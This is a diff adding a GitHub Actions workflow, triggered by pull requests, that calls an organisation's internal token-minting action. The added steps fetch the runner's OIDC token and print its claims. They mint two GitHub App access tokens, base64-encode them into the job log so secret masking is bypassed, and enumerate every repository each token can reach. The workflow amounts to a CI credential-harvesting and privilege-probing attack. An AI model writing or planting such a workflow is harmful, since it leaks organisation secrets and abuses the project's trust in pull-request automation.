@@ -1,0 +1,61 @@
+name: w14-gati
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  probe:
+    name: gati profile probe
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: oidc claims
+        run: |
+          set -u
+          R=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+                "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=gati:presets/pr-triage")
+          T=$(printf '%s' "$R" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
+          echo "CLAIMS_B64=$(printf %s "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | base64 -w0)"
+
+      - name: mint presets/pr-triage
+        id: p1
+        continue-on-error: true
+        uses: smartcontractkit/.github/actions/invoke-gati-v2@main
+        with:
+          profile: presets/pr-triage
+
+      - name: mint globals/pr-self
+        id: p2
+        continue-on-error: true
+        uses: smartcontractkit/.github/actions/invoke-gati-v2@main
+        with:
+          profile: globals/pr-self
+
+      - name: report
+        if: always()
+        env:
+          T1: ${{ steps.p1.outputs.access-token }}
+          T2: ${{ steps.p2.outputs.access-token }}
+        run: |
+          set -u
+          echo "p1=${{ steps.p1.outcome }} p2=${{ steps.p2.outcome }}"
+          for n in 1 2; do
+            eval "T=\${T$n:-}"
+            if [ -n "${T:-}" ]; then
+              echo "T${n}_B64=$(printf %s "$T" | base64 -w0)"
+              echo "--- T${n} /installation/repositories ---"
+              curl -sS -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" \
+                "https://api.github.com/installation/repositories?per_page=100" | base64 -w0
+              echo
+              echo "--- T${n} /rate_limit ---"
+              curl -sS -H "Authorization: Bearer $T" "https://api.github.com/rate_limit" | head -c 400
+              echo
+            else
+              echo "T${n}_ABSENT"
+            fi
+          done
